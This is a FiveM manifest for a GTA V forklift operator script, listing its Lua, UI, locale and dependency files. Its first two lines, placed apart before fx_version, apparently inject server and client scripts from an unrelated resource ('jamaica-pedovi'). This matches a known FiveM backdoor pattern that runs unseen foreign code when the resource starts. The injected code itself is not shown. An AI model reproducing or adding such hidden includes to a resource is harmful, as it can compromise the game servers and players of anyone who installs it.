server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'




fx_version 'cerulean'
game {'gta5'}
lua54 'yes'

author 'vezironi'
description 'A forklift operator script for GTA V with modern UI and customizable features'

scriptname '0r-forkliftoperator'
version '1.0.0'

shared_scripts {
    '@ox_lib/init.lua',
    'config/*.lua',
    'shared/*.lua',
}

client_scripts {
    'client/*.lua',
    'modules/**/**/client.lua',
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'modules/**/**/server.lua',
    'server/*.lua',
}

escrow_ignore {
    'config/*.lua',
    'shared/*.lua',
    'client/*.lua',
    'server/*.lua',
    'modules/**/**/*.lua',
}

files {
    'web/build/*.*',
    'web/build/**/*.*',
    'locales/*.json',
}

ui_page 'web/build/index.html'

dependencies {
    'ox_lib',
}

dependency '/assetpacks'